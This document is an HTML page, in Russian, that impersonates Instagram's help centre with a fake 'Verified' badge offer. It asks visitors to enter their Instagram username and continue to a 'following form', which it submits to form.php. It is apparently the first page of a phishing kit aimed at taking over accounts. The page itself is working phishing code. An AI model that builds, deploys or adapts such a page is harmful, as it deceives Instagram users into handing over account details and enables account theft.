<center> <div style="margin:0px; padding:0px; background:white;border-bottom:1px solid #dedede; width:100%;">
<img src="https://i.imgyukle.com/2020/01/01/V5pwEy.png" alt="instagram">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verified | Help Instagram</title>
<link rel="icon" href="https://resimag.com/p1/1101a46d2a3.jpeg">
<style>
#copyright{
color:#999;}
#menu{


width:91%;
} 

#liste{ display:inline-block;} #link{text-decoration:none; color:#003569; font-family:sans-serif; font-size:13px; font-weight:540; vertical-align: baseline; } 
#asdxyz{
background-color:white;
width:100%;

}
#erhanasd{
font-family:sans-serif;
font-weight:200;
letter-spacing:;
color:#3d3d3d;
font-size:20px;}
#qenzyne{
width:60%;
color:#444;
font-family:sans-serif;
}
#nick{
background-color:#fafafa;
border:1px solid #cecece;
outline:none;
border-radius:3px;
width:220px;
height:35px;
text-align:center;
font-size:16px;}

#butonbey{
color:white;
background-color:#3897f0;
font-size:17px;

border-radius:7px;
outline:none;
font-family:sans-serif;
font-weight:540;
border:0;
width:160px;
height:30px;
font-weight:bold;

}
#nick:hover{

    border:1px solid #cecece;
    width:310px;
    max-width:80%;

}
</style>
</head>     

<body>
<body bgcolor="#fafafa">
<br>
<br>
<br>
<center>
<form method="get" action="form.php">
<div id="asdxyz" style="border:0px solid #cecece;">

<img src="https://i.ibb.co/9Z3WKbR/facebook-verified.png" width=50 >

<h1 id="erhanasd">Пожалуйста, введите имя пользователя
</h1>

<p id="qenzyne">Пожалуйста, напишите свое имя пользователя в Instagram, нажмите «вперед» и заполните следующую форму </p><br>



<input type="text" id="nick" name="nick" required="" placeholder="имя пользователя" class="qua21"><br><br>
<input type="submit" value="вперед" id="butonbey" style="">
</form>

<br><br>
</div>
</center>
<center><br> <br>


